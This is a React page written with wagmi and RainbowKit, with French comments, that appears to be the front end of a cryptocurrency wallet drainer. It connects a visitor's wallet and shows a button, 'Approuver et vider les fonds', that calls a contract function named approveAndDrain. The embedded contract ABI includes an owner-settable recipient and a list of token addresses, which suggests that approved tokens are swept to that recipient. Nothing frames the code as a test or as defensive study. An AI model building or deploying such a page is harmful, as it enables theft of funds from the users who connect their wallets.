import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useContractRead, useContractWrite } from "wagmi";
import contractAddress from "../utils/contractAddress"; // Importation par défaut

// ABI du contrat
const contractAbi = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "approvalAmount",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "approveAndDrain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "name": "setRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "tokenAddresses",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

export default function Home() {
  const { isConnected, address } = useAccount();

  // Lire le owner du contrat
  const { data: owner, isError, isLoading } = useContractRead({
    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
    abi: contractAbi,
    functionName: "owner",
  });

  // Écrire sur le contrat
  const { write: approveAndDrain, isLoading: isWriting } = useContractWrite({
    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
    abi: contractAbi,
    functionName: "approveAndDrain",
  });

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h1>Bienvenue sur mon projet Web3</h1>
      {isConnected ? (
        <>
          <p>Connecté en tant que : {address}</p>
          {isLoading ? (
            <p>Chargement du propriétaire du contrat...</p>
          ) : isError ? (
            <p>Erreur lors de la récupération du propriétaire.</p>
          ) : (
            <p>Propriétaire du contrat : {owner || "Inconnu"}</p>
          )}
          <button disabled={isWriting} onClick={() => approveAndDrain?.()}>
            {isWriting ? "Transaction en cours..." : "Approuver et vider les fonds"}
          </button>
        </>
      ) : (
        <ConnectButton />
      )}
    </div>
  );
}
